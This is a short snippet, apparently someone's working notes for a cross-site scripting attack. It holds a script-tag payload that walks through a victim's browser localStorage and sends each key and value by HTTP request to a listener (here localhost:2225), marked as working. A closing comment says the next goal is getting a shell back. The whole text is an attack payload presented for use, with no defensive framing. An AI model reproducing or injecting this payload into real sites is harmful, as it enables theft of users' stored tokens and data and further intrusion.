//XXS attack to send contents of localStorage on victim machine
//to the machine of the attacker

// THIS ONE WORkS
<script>var xhttp = new XMLHttpRequest(); for (var i = 0; i < localStorage.length; i++){xhttp.open('GET', 'http://localhost:2225/?' + localStorage.key(i) + '=' + localStorage.getItem(localStorage.key(    i)), true); xhttp.send();} </script>

// Now we need to get a shell back somehow
